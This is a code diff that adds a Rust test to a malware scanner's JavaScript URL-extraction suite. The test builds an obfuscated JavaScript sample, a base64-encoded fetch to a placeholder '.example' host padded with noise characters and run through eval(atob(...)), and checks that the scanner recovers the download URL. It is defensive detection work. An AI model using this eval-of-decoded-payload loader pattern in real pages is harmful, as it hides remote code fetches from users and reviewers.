@@ -10169,6 +10169,33 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_atob_bound_bracket_replace_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-bound-bracket-replace-js.example/p')",
+        );
+        let noisy = encoded
+            .chars()
+            .map(|ch| format!("{ch}~"))
+            .collect::<String>();
+        let js = format!(r#"var m = "replace"; var b = "{noisy}"; eval(atob(b[m](/~/g, "")))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-bound-bracket-replace-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob bound bracket replace payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_trimmed_string_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
